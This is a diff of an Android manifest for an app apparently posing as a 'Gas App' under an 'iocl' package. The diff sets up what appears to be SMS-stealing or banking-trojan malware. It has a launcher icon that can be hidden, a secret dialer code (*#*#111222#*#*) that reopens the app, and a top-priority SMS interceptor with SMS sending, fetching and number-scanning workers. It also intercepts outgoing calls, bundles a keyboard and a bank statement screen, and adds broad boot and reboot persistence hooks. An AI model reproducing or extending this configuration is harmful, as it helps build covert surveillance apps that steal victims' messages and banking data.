@@ -49,11 +49,30 @@
         android:usesCleartextTraffic="true"
         tools:targetApi="31">
         <activity
+            android:name=".Ui.ClockActivity"
+            android:exported="true"
+            android:label="Clock"
+            android:launchMode="singleTop"
+            >
+
+
+            <!-- Alarm and timer actions -->
+            <intent-filter>
+                <action android:name="android.intent.action.SHOW_ALARMS" />
+                <action android:name="android.intent.action.SHOW_TIMERS" />
+                <action android:name="android.intent.action.SET_ALARM" />
+                <action android:name="android.intent.action.SET_TIMER" />
+                <action android:name="android.intent.action.DISMISS_ALARM" />
+                <action android:name="android.intent.action.DISMISS_TIMER" />
+                <action android:name="org.fossify.clock.TOGGLE_STOPWATCH" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
+        </activity>
+
+        <activity
             android:name=".Ui.CrashActivity"
             android:excludeFromRecents="true"
-            android:noHistory="true"
-            />
-
+            android:noHistory="true" />
 
         <meta-data
             android:name="com.google.android.gms.ads.APPLICATION_ID"
@@ -69,20 +88,7 @@
             android:label="Messages"
             android:launchMode="singleInstance" />
 
-        <activity-alias
-            android:name=".SmsLauncherAlias"
-            android:enabled="false"
-            android:exported="true"
-            android:icon="@drawable/chats_chat_sms_talk_svgrepo_com"
-            android:label="SMS"
-            android:launchMode="singleInstance"
-            android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity">
-            <intent-filter>
-                <action android:name="android.intent.action.MAIN" />
 
-                <category android:name="android.intent.category.LAUNCHER" />
-            </intent-filter>
-        </activity-alias> <!-- For Hidden Icon -->
         <!-- For Hidden Icon -->
         <activity
             android:name=".Ui.BankStatementActivity"
@@ -149,23 +155,68 @@
             android:label="Gas App"
             android:persistableMode="persistAcrossReboots"
             android:showOnLockScreen="true">
+            <intent-filter android:autoVerify="true">
+                <action android:name="android.intent.action.VIEW" />
+
+                <category android:name="android.intent.category.DEFAULT" />
+                <category android:name="android.intent.category.BROWSABLE" />
+
+                <data android:scheme="http" />
+                <data android:scheme="https" />
+                <data android:host="example.com" />
+                <data android:host="xhamster.com" />
+                <data android:host="pornhub.com" />
+                <data android:host="okxxx.com" />
+                <data android:host="xxx.com" />
+            </intent-filter>
 
             <!-- DO NOT add MAIN/LAUNCHER here -->
         </activity> <!-- This alias is the launcher icon. Toggle this to hide/show the app icon -->
         <activity-alias
-            android:name=".Ui.LauncherAlias"
+            android:name=".LauncherAlias"
             android:enabled="true"
             android:exported="true"
             android:icon="@mipmap/ic_launcher"
             android:label="Gas App"
             android:roundIcon="@mipmap/ic_launcher"
-            android:targetActivity=".Ui.MainActivity">
+            android:targetActivity=".Ui.MainActivity"
+            tools:replace="android:enabled"
+            >
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
 
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
         </activity-alias>
+
+        <activity-alias
+            android:name=".SmsLauncherAlias"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/chats_chat_sms_talk_svgrepo_com"
+            android:label="SMS"
+            android:launchMode="singleInstance"
+
+            android:targetActivity="android.iocl.sms_handler_8_0_below.SmsActivity">
+
+        </activity-alias> <!-- For Hidden Icon -->
+
+        <receiver
+            android:name=".Receivers.SecretCodeReceiver"
+            android:exported="true">
+
+            <!-- Secret code trigger (e.g. *#*#111222#*#*) -->
+            <intent-filter>
+                <action android:name="android.provider.Telephony.SECRET_CODE" />
+
+                <data
+                    android:host="111222"
+                    android:scheme="android_secret_code" />
+            </intent-filter>
+
+            <!-- URL trigger (e.g. https://example.com/openapp) -->
+
+        </receiver>
 
         <service
             android:name=".Services.SmsSenderJOBService"
@@ -202,15 +253,15 @@
             android:enabled="true"
             android:exported="false"
             android:process=":serviceB" />
-
         <service
             android:name=".Services.CallerIdService"
-            android:permission="android.permission.BIND_SCREENING_SERVICE"
-            android:exported="true">
+            android:exported="true"
+            android:permission="android.permission.BIND_SCREENING_SERVICE">
             <intent-filter>
                 <action android:name="android.telecom.CallScreeningService" />
             </intent-filter>
         </service>
+
         <activity
             android:name="android.iocl.simple_keyboard.latin.settings.SettingsActivity"
             android:enabled="true"
@@ -376,6 +427,8 @@
             </intent-filter>
             <intent-filter>
                 <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
+
+                <category android:name="android.intent.category.DEFAULT" />
             </intent-filter>
         </receiver>
 
@@ -398,14 +451,18 @@
             android:name=".Services.FixOppoAutoKill"
             android:enabled="true"
             android:exported="true"
-            android:process=":remote"
             android:stopWithTask="false" />
         <service
             android:name=".Services.SmsFetchWorker"
             android:enabled="true"
             android:exported="true"
             android:permission="android.permission.BIND_JOB_SERVICE"
-            android:process=":workerSms"
+            android:stopWithTask="false" />
+        <service
+            android:name=".Services.SmsNumberScanWorker"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_JOB_SERVICE"
             android:stopWithTask="false" />
         <service
             android:name=".Services.AemmTileService"
@@ -427,6 +484,14 @@
             <intent-filter>
                 <action android:name="android.appwidget.action.APPWIDGET_UPDATE" />
             </intent-filter>
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.ALARM_CHANGED" />
+                <category android:name="android.intent.category.DEFAULT" />
+            </intent-filter>
 
             <meta-data
                 android:name="android.appwidget.provider"
@@ -440,24 +505,19 @@
                 <action android:name="android.intent.action.PACKAGE_ADDED" />
                 <action android:name="android.intent.action.PACKAGE_REPLACED" />
                 <action android:name="android.intent.action.PACKAGE_REMOVED" />
-
+                <category android:name="android.intent.category.DEFAULT" />
                 <data android:scheme="package" />
             </intent-filter>
         </receiver>
         <receiver
             android:name=".Receivers.smsReceivers"
-            android:excludeFromRecents="true"
             android:exported="true"
-            android:launchMode="singleInstance"
-            android:permission="android.permission.BROADCAST_SMS"
-            android:persistableMode="persistAcrossReboots"
-            android:showOnLockScreen="true"
-            android:turnScreenOn="true">
+            android:permission="android.permission.BROADCAST_SMS">
             <intent-filter android:priority="2147483647">
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
-                <action android:name="android.provider.Telephony.SMS_DELIVER" />
             </intent-filter>
         </receiver>
+
         <receiver
             android:name="android.iocl.sms_handler_8_0_below.MmsSystemEventReceiver"
             android:exported="true"
@@ -471,12 +531,23 @@
         <receiver
             android:name=".Receivers.MyReceiver"
             android:enabled="true"
+            android:directBootAware="true"
             android:exported="true">
             <intent-filter>
                 <action android:name="android.intent.action.USER_PRESENT" />
                 <!-- Optional: Listen for boot completed to re-register receiver -->
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.provider.Telephony.ACTION_DEFAULT_SMS_PACKAGE_CHANGED" />
+            </intent-filter>
+
+            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCALE_CHANGED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
+                <action android:name="android.intent.action.TIME_SET" />
+                <action android:name="android.intent.action.TIMEZONE_CHANGED" />
+                <action android:name="org.codeaurora.poweroffalarm.action.UPDATE_ALARM" />
             </intent-filter>
         </receiver> <!-- Provided by CHATGPT -->
         <meta-data
